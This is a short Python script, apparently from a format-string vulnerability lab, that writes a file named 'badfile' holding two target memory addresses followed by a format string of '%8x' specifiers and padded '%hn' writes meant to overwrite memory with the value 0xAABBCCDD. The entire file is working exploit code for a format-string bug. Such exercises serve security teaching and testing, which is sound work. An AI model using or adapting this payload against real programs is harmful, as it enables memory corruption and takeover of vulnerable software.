#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# Create the input
number = 0x080e506A
content[0:4]  =  (number).to_bytes(4,byteorder='little')

content[4:8] = "@@@@".encode('latin-1')

number  = 0x080e5068
content[8:12]  =  (number).to_bytes(4,byteorder='little')

s = "%8x"*62 + "%43199x"+ "%hn" + "%8738x"+ "%hn" + "\n" # 0xAABBCCDD

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
